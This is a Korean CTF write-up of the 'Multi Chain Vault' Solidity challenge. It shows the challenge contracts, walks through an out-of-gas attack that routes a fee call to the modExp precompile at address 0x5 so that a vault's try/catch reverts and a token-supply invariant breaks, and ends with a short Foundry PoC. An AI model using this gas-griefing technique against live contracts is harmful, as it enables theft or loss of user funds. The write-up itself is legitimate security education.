---
title: (Write-up) Cykor CTF 2025 - Multi Chain Vault
date: 2025-12-08 09:30:00 +0900
math: true
---

![Multi Chain Vault](assets/img/posts/2025-12-08-CykorCTF/multi_chain_vault_thumbnail.png "Multi Chain Vault")

## 문제 source

```js
/**
 * Setup.sol
*/

// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.30;

import {HyuunnToken} from "./HyuunnToken.sol";
import {HyuunnVault} from "./HyuunnVault.sol";
import {MockRelayer} from "./MockRelayer.sol";

contract Setup {
    HyuunnVault public HyuunnVaultInstance;
    HyuunnToken public HyuunnTokenInstance;
    MockRelayer public MockRelayerInstance;

    bool chance = true;

    constructor() {
        HyuunnTokenInstance = new HyuunnToken();
        HyuunnVaultInstance = new HyuunnVault(address(HyuunnTokenInstance));
        MockRelayerInstance = new MockRelayer(address(HyuunnVaultInstance), address(HyuunnTokenInstance));

        HyuunnTokenInstance.transfer(address(MockRelayerInstance), 100e18);

        HyuunnVaultInstance.setRelayer(address(MockRelayerInstance));
        HyuunnTokenInstance.setMinter(address(HyuunnVaultInstance));
    }
    
    function isSolved() public returns (bool) {
        
        // Ensure this can only be called once
        if (!chance) {
            return false;
        }
        chance = false;

        MockRelayerInstance.executeQueued();

        try this.testTotalSupplyInvariant() returns (bool ok) {
            if (!ok) return true;
        } catch {
            return true;
        }

        return false;
    }

    function testTotalSupplyInvariant() external view returns (bool) {
        return (
            HyuunnTokenInstance.balanceOf(address(MockRelayerInstance)) +
            HyuunnTokenInstance.balanceOf(address(HyuunnVaultInstance)) +
            HyuunnVaultInstance.totalTrapped()
        ) == 100e18;
    }
}
```

```js
/**
 * HyuunnToken.sol
*/

// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.30;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract HyuunnToken is ERC20 {
    address minter;

    constructor() ERC20("HyuunnToken", "HYT") {
        _mint(msg.sender, 100 * 10 ** decimals());
        minter = msg.sender;
    }

    function burn(uint256 amount) external {
        _burn(msg.sender, amount);
    }

    function mint(uint256 amount) external {
        require(msg.sender == minter, "only minter");
        _mint(msg.sender, amount);
    }

    function setMinter(address _minter) external {
        require(msg.sender == minter, "only minter");
        minter = _minter;
    }
}
```

```js
/**
 * HyuunnVault.sol
*/

// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.30;

import {ERC4626} from "@openzeppelin/contracts/token/ERC20/extensions/ERC4626.sol";
import {ERC20, IERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {ECDSA} from "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";

import {HyuunnToken} from "./HyuunnToken.sol";

interface IFeeReceiver {
    function onFeeReceived(address executor, uint256 feeAmount, bytes calldata data) external payable returns (bytes4);
}

contract HyuunnVault is ERC4626, Ownable {

    enum Action { Deposit, Mint }

    uint256 public totalTrapped;
    mapping(address => uint256) public trapped;
    event Trapped(address indexed receiver, uint256 amount, uint256 totalTrapped);

    mapping(address => bool) public isFeeReceiverAllowed;
    event FeeReceiverAllowedSet(address indexed feeReceiver, bool allowed);

    mapping(bytes32 => bool) public executed;
    event Executed(bytes32 indexed id, Action action, address indexed receiver, uint256 assetsOrShares);
    event ExecuteFailed(bytes32 indexed id, Action action, string reason);
    address public relayer;
    event RelayerSet(address indexed relayer);

    event FeeAckLogged(
        address indexed executor,
        address indexed feeReceiver,
        uint256 indexed feeAmount,
        bytes32 retHash
    );

    bytes4 private constant _FEE_MAGIC = IFeeReceiver.onFeeReceived.selector;

    bytes32 test;
    uint256 public feeCalls = 0;

    constructor(address asset_)
        ERC4626(IERC20(asset_))
        ERC20("HyuunnVault", "HYV")
        Ownable(msg.sender)
    {}

    function setRelayer(address _relayer) external onlyOwner {
        require(_relayer != address(0), "zero relayer");
        relayer = _relayer;
        emit RelayerSet(_relayer);
    }

    function setFeeReceiverAllowed(address feeReceiver, bool allowed) external onlyOwner {
        require(feeReceiver.code.length > 0, "feeReceiver not contract");
        isFeeReceiverAllowed[feeReceiver] = allowed;
        emit FeeReceiverAllowedSet(feeReceiver, allowed);
    }
 
    modifier onlyRelayer() {
        require(msg.sender == relayer, "not relayer");
        _;
    }

    function execute(
        bytes calldata payload,
        address payable feeRcvr,
        bytes calldata feeData,
        bytes calldata relayerSig
    ) external payable {
        (bytes32 id, Action action, address receiver, uint256 amt, uint256 feeAmount) =
            abi.decode(payload, (bytes32, Action, address, uint256, uint256));

        require(!executed[id], "replay"); 
        executed[id] = true;

        require(address(this).balance >= feeAmount, "insufficient fee");

        _verifyRelayerAuth(id, action, receiver, amt, feeAmount, relayerSig);

        if (action == Action.Deposit) {
            try this._performDepositExternal(amt, receiver, feeRcvr, feeAmount, feeData, msg.sender) returns (uint256 minted) {
                emit Executed(id, action, receiver, amt);
            } catch Error(string memory reason) {
                trapped[receiver] += amt;
                totalTrapped += amt;
                emit Trapped(receiver, amt, totalTrapped);
                emit ExecuteFailed(id, action, reason);
            } catch {
                trapped[receiver] += amt;
                totalTrapped += amt;
                emit Trapped(receiver, amt, totalTrapped);
                emit ExecuteFailed(id, action, "execution failed");
            }

        } else if (action == Action.Mint) {
            uint256 assetsNeeded = previewMint(amt);
            try this._performMintExternal(amt, receiver, feeRcvr, feeAmount, feeData, msg.sender) returns (uint256 usedAssets) {
                emit Executed(id, action, receiver, amt);
            } catch Error(string memory reason) {
                trapped[receiver] += assetsNeeded;
                totalTrapped += assetsNeeded;
                emit Trapped(receiver, assetsNeeded, totalTrapped);
                emit ExecuteFailed(id, action, reason);
            } catch {
                trapped[receiver] += assetsNeeded;
                totalTrapped += assetsNeeded;
                emit Trapped(receiver, assetsNeeded, totalTrapped);
                emit ExecuteFailed(id, action, "execution failed");
            }

        } else {
            revert("unsupported");
        }
    }

    function _verifyRelayerAuth(
        bytes32 id,
        Action action,
        address receiver,
        uint256 amt,
        uint256 feeAmount,
        bytes calldata relayerSig
    ) internal view {
        if (msg.sender == relayer) {
            return;
        }
        require(relayer != address(0), "relayer unset");
        require(relayerSig.length != 0, "missing relayer sig");

        bytes32 hash = keccak256(
            abi.encode(
                id,
                uint8(action),
                receiver,
                amt,
                feeAmount,
                block.chainid,
                address(this)
            )
        );
        address signer = ECDSA.recover(hash, relayerSig);
        require(signer == relayer, "bad relayer sig");
    }


    function _payFee(address executor, address payable feeReceiver, uint256 feeAmount, bytes memory feeData) internal {
        if (feeAmount == 0) return;

        if (feeReceiver.code.length != 0) {
            require(isFeeReceiverAllowed[feeReceiver], "fee receiver not allowed");
        }

        (bool ok2, bytes memory ret) =
            feeReceiver.call{value: feeAmount}(
                abi.encodeWithSelector(_FEE_MAGIC, executor, feeAmount, feeData)
            );
        require(ok2, "fee call fail");

        if (ret.length > 0) {
            require(bytes4(ret) == _FEE_MAGIC, "bad fee magic");
            
            emit FeeAckLogged(
                executor,
                feeReceiver,
                feeAmount,
                keccak256(ret)
            );
        }

        feeCalls += 1;
    }

    function _performDepositExternal(uint256 assets, address receiver, address payable feeRcvr, uint256 feeAmount, bytes memory feeData, address executor) external returns (uint256 shares) {
        require(msg.sender == address(this), "only self");

        shares = previewDeposit(assets);
        HyuunnToken(asset()).mint(assets);

        _mint(receiver, shares);
        emit Deposit(msg.sender, receiver, assets, shares);

        _payFee(executor, feeRcvr, feeAmount, feeData);
    }

    function _performMintExternal(uint256 shares, address receiver, address payable feeRcvr, uint256 feeAmount, bytes memory feeData, address executor) external returns (uint256 usedAssets) {
        require(msg.sender == address(this), "only self");

        usedAssets = previewMint(shares);
        HyuunnToken(asset()).mint(usedAssets);

        _mint(receiver, shares);
        emit Deposit(msg.sender, receiver, usedAssets, shares);

        _payFee(executor, feeRcvr, feeAmount, feeData);
    }

    function releaseTrappedLocal(address to, uint256 amount) external onlyOwner {
        require(trapped[to] >= amount && amount > 0, "bad amount");
        trapped[to] -= amount;
        IERC20(asset()).transfer(to, amount);
    }

    function totalAssets() public view virtual override returns (uint256) {
        return IERC20(asset()).balanceOf(address(this)) - totalTrapped;
    }

    receive() external payable {}
}
```

```js
/**
 * MockRelayer.sol
*/

// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.30;

import {HyuunnToken} from "./HyuunnToken.sol";
import {HyuunnVault} from "./HyuunnVault.sol";

import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";

import {Test, console} from "forge-std/Test.sol";

contract MockRelayer is Ownable {
    HyuunnVault public vault;
    HyuunnToken public token;

    uint256 private _nextId;

    uint256 public reservedTokens;

    event ReserveUpdated(uint256 oldReserved, uint256 newReserved);

    struct Request {
        bytes32 id;
        HyuunnVault.Action action;
        address receiver; 
        uint256 amount;
        uint256 fee; 
        address payable feeRcvr;
        bytes feeData;
        bool executed;
        bool canceled;
    }

    Request[] public queue;

    event Presented(bytes32 indexed id, uint256 indexed idx, address indexed receiver, uint256 amount, uint256 fee);
    event Executed(bytes32 indexed id, uint256 indexed idx);
    event ExecuteFailed(bytes32 indexed id, uint256 indexed idx, string reason);
    event Canceled(bytes32 indexed id, uint256 indexed idx);

    constructor(address vaultAddress, address tokenAddress) Ownable(msg.sender) {
        vault = HyuunnVault(payable(vaultAddress));
        token = HyuunnToken(tokenAddress);
        _nextId = 1;
    }

    function submitDepositRequest(
        uint256 amount,
        address receiver,
        uint256 fee,
        address payable feeRcvr,
        bytes calldata feeData
    ) external payable {
        require(msg.value == fee, "fee mismatch");
        require(amount <= availableTokens(), "exceeds available tokens");

        require(queue.length < 1, "only one request");
        require(feeData.length <= 6400, "feedata too long");

        bytes32 id = bytes32(_nextId++);
        Request memory r = Request({
            id: id,
            action: HyuunnVault.Action.Deposit,
            receiver: receiver,
            amount: amount,
            fee: fee,
            feeRcvr: feeRcvr,
            feeData: feeData,
            executed: false,
            canceled: false
        });

        address(vault).call{value: fee}("");

        uint256 oldRes = reservedTokens;
        reservedTokens = oldRes + amount;
        emit ReserveUpdated(oldRes, reservedTokens);

        queue.push(r);
        emit Presented(id, queue.length - 1, receiver, amount, fee);
    }

    function executeQueued() external onlyOwner {
        uint256 n = queue.length;
        for (uint256 i = 0; i < n; i++) {
            Request storage r = queue[i];
            if (r.executed || r.canceled) continue;

            bytes memory payload = abi.encode(r.id, r.action, r.receiver, r.amount, r.fee);

            token.burn(r.amount);
            try vault.execute{gas: 179237}(payload, r.feeRcvr, r.feeData, "") {
                require(reservedTokens >= r.amount, "reserved underflow");
                uint256 oldRes = reservedTokens;
                reservedTokens = oldRes - r.amount;
                emit ReserveUpdated(oldRes, reservedTokens);

                r.executed = true;
                emit Executed(r.id, i);
            } catch Error(string memory reason) {
                emit ExecuteFailed(r.id, i, reason);
            } catch {
                emit ExecuteFailed(r.id, i, "execution failed");
            }
        }
    }

    function cancel(uint256 idx, address payable refundTo) external onlyOwner {
        require(idx < queue.length, "bad index");
        Request storage r = queue[idx];
        require(!r.executed && !r.canceled, "already done");
        r.canceled = true;

        require(reservedTokens >= r.amount, "reserved underflow");
        uint256 oldRes = reservedTokens;
        reservedTokens = oldRes - r.amount;
        emit ReserveUpdated(oldRes, reservedTokens);

        if (r.fee > 0) {
            (bool ok, ) = refundTo.call{value: r.fee}("");
            require(ok, "refund failed");
            r.fee = 0;
        }
        emit Canceled(r.id, idx);
    }

    function availableTokens() public view returns (uint256) {
        uint256 bal = token.balanceOf(address(this));
        return bal > reservedTokens ? (bal - reservedTokens) : 0;
    }
}
```

전체적인 구조는 사용자가 `MockRelayer::submitDepositRequest` 를 통해 queue에 $HYT에 대한Deposit Request를 push한 뒤, owner에 의해 `MockRelayer::executeQueued`가 실행되어 Deposit이 실행되는 구조이다. 

이 과정에서 $HYT가 MockRelayer, HyuunnVault컨트랙트를 넘나들면서 두 컨트랙트에 있는 토큰 총 합이 유지되는데, 이 문제의 목표는 이 **합(Invariant)이 유지되지 않도록** 하는 것이다.

```js
function testTotalSupplyInvariant() external view returns (bool) {
    return (
        HyuunnTokenInstance.balanceOf(address(MockRelayerInstance)) +
        HyuunnTokenInstance.balanceOf(address(HyuunnVaultInstance)) +
        HyuunnVaultInstance.totalTrapped()
    ) == 100e18;
}
```

단계별 Invariant 변화

1. MockRelayer컨트랙트에 **100e18 $HYT**저장 
2. `MockRelayer::executeQueued`가 실행되면 `token.burn(r.amount)`가 실행되어 **queue된 amount**만큼 **burn** 후 `HyuunnVault::execute`에서 `HyuunnToken(asset()).mint(assets)`를 통해 같은 양을 **mint**
3. 만약 mint함수 실행에 실패한다면, catch문에서 `totalTrapped += r.amount`로 같은 양을 **trap**.

이로 인해 일반적인 방법으로는 Invariant가 깨지지 않는 것을 확인할 수 있다.

때문에 token을 **추가로** mint하거나, burn을 하여 Invariant가 깨지도록 해야하는데, mint()하는 방법은 찾지 못했기 때문에, burn을 하는 방향으로 문제를 해결했다. 

위 단계별 Invariant 변화를 보면, executeQueued에서 burn을 하는 과정이 포함된다. 이를 이용해보자.

```js
function executeQueued() external onlyOwner {
    uint256 n = queue.length;
    for (uint256 i = 0; i < n; i++) {
        Request storage r = queue[i];
        if (r.executed || r.canceled) continue;

        bytes memory payload = abi.encode(r.id, r.action, r.receiver, r.amount, r.fee);

        token.burn(r.amount);
        try vault.execute{gas: 179237}(payload, r.feeRcvr, r.feeData, "") {
            require(reservedTokens >= r.amount, "reserved underflow");
            uint256 oldRes = reservedTokens;
            reservedTokens = oldRes - r.amount;
            emit ReserveUpdated(oldRes, reservedTokens);

            r.executed = true;
            emit Executed(r.id, i);
        } catch Error(string memory reason) {
            emit ExecuteFailed(r.id, i, reason);
        } catch {
            emit ExecuteFailed(r.id, i, "execution failed");
        }
    }
}
```

executeQueued함수를 보면, token.burn이 실행된 뒤, try~catch를 통해 vault.execute에 대한 핸들링을 하는데, 만약 vault.execute가 revert되어 소각된만큼 mint나 trap이 이루어지지 않고 실행이 종료된다면, Invariant가 깨질 것이다. execute함수를 revert시키는 것을 목표로 하고 계속 진행해보자.

- execute를 실행할 때 gas: 179237 옵션을 주는 것을 기억하고 가자.

```js
require(!executed[id], "replay");
executed[id] = true;
require(address(this).balance >= feeAmount, "insufficient fee");
_verifyRelayerAuth(id, action, receiver, amt, feeAmount, relayerSig);
```

execute함수 내부 로직이다. 위 로직에서 revert를 할 수 있는 방법을 생각해봤지만 모두 불가능하다. 

- relayer 또는 위임된 주소만 실행이 가능하기 때문에 id replay 불가능
- balance에 이미 feeAmount가 반영되어있어 두 번째 require문도 통과됨

따라서 그 후행되는 로직을 보면,

```js
try this._performDepositExternal(amt, receiver, feeRcvr, feeAmount, feeData, msg.sender) returns (uint256 minted) {
    emit Executed(id, action, receiver, amt);
} catch Error(string memory reason) {
    trapped[receiver] += amt;
    totalTrapped += amt;
    emit Trapped(receiver, amt, totalTrapped);
    emit ExecuteFailed(id, action, reason);
} catch {
    trapped[receiver] += amt;
    totalTrapped += amt;
    emit Trapped(receiver, amt, totalTrapped);
    emit ExecuteFailed(id, action, "execution failed");
}
```

이렇게 이루어져있다. 결국 revert되려면 try문과 catch문 모두 실패해야 한다. try문은 함수 로직이니 그렇다 쳐도, catch문은 정상적인 방법으로 revert되게 할 방법이 없기 때문에, 결국 방법은 OOG(Out Of Gas) 뿐이다. 

EVM에서는 함수 call을 할 때 남은 gas의 63/64를 해당 컨텍스트에 넘기고 나머지 1/64는 현재 컨텍스트에 남겨놓는데, `this._performDepositExternal`에서 63/64를 **모두 소진시키면** catch문을 실행할 때 필요한 gas가 남지 않기 때문에 revert가 가능하다.

`this._performDepositExternal`함수를 살펴보면,

```js
function _performDepositExternal(uint256 assets, address receiver, address payable feeRcvr, uint256 feeAmount, bytes memory feeData, address executor) external returns (uint256 shares) {
    require(msg.sender == address(this), "only self");

    shares = previewDeposit(assets);
    HyuunnToken(asset()).mint(assets);

    _mint(receiver, shares);
    emit Deposit(msg.sender, receiver, assets, shares);

    _payFee(executor, feeRcvr, feeAmount, feeData);
}

function _payFee(address executor, address payable feeReceiver, uint256 feeAmount, bytes memory feeData) internal {
    if (feeAmount == 0) return;

    if (feeReceiver.code.length != 0) {
        require(isFeeReceiverAllowed[feeReceiver], "fee receiver not allowed");
    }

    (bool ok2, bytes memory ret) =
        feeReceiver.call{value: feeAmount}(
            abi.encodeWithSelector(_FEE_MAGIC, executor, feeAmount, feeData)
        );
    require(ok2, "fee call fail");

    if (ret.length > 0) {
        require(bytes4(ret) == _FEE_MAGIC, "bad fee magic");
        
        emit FeeAckLogged(
            executor,
            feeReceiver,
            feeAmount,
            keccak256(ret)
        );
    }

    feeCalls += 1;
}
```

특별히 gas를 소진시킬만한 호출은 보이지 않지만, `feeReceiver.call`을 악용할 수는 있어보인다. 

feeReceiver가 임의로 지정이 가능한 주소이기 때문에 gas를 모두 소진시키는 함수를 넣어두고, 실행될 수 있도록 하면 해결이 가능하다. 하지만 `feeReceiver.code.length != 0`이기 때문에 EOA주소로만 지정할 수 있어 보인다. 하지만, EVM의 **precompiled contract** 또한 code.length가 0으로 저장되어있기 때문에, 이를 이용하면 될 듯 하다.

![call to receiver: calldata](assets/img/posts/2025-12-08-CykorCTF/multichainvault_call_to_receiver.png "call to receiver: calldata")

Gemini에게 precompiled contract 중 gas를 많이 소모하는 컨트랙트를 물어보니 **modExp(0x5)**를 알려주었다.

`feeReceiver`를 **precompiled::modExp**인 **address(0x5)**로 지정하여 call을 하도록 하면, modExp연산을 하기에는 너무나 큰 데이터가 calldata로 들어가게 된다. 따라서, 이 부분에서 gas 부족으로 인해 에러가 발생한다.

![modExp failed](assets/img/posts/2025-12-08-CykorCTF/multichainvault_modExp_fail.png "modExp failed")

이후 남은 gas만으로 아래 연산을 진행해야한다.

```js
trapped[receiver] += assetsNeeded;
totalTrapped += assetsNeeded;
emit Trapped(receiver, assetsNeeded, totalTrapped);
emit ExecuteFailed(id, action, "execution failed");
```

(곁다리 연산은 생략하고)두 번의 sload, sstore연산과 두 번의 log3 연산을 해야하는데, 1/64만 남은 gas로는 모두 처리할 수 없어 이 부분에서도 결국 **OOG**가 발생하게 된다.

~~(사실 여기서 revert 안될 줄 알고 feeData 조절해서 revert시켜야되겠구나~ 했는데 그냥 바로 돼서 당황했다.)~~

![OOG](assets/img/posts/2025-12-08-CykorCTF/multichainvault_OOG.png "OOG")

이렇게 하면 execute함수를 revert시켜 Invariant를 깰 수 있게 된다. 

amount값만 양수로 잘 해서 전달하면 문제를 해결할 수 있다.

## PoC
```js
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import "../src/Setup.sol";

contract CounterScript is Script {
    Setup setup;

    function setUp() public {
        setup = Setup(address(/* setup addr */));
        // setup = new Setup(); 
    } 

    function run() public {
        uint256 pvkey = /* pvkey */;
        address sender = vm.addr(pvkey);
        vm.startBroadcast(pvkey);

        uint feeAmt = 1; // 아무 숫자나 넣어도 상관X
        uint amount = 1e18; // 양수 아무거나~
        address receiver = sender; // 아무 주소나 줘도 상관X
        address feeRcvr = address(0x5); // ModExp precompiled address
        setup.MockRelayerInstance().submitDepositRequest{value: feeAmt}(amount, receiver, feeAmt, payable(feeRcvr), "");

        vm.stopBroadcast();
    }
}
```

긴 풀이 과정에 비해 PoC는 굉장히 짧다. 결국 포인트는 receiver를 0x5 precompiled contract로 지정하는 것.

재밌는 문제를 만들어준 [@bshyuunn](x.com/bshyuunn?s=21) 님에게 감사를~
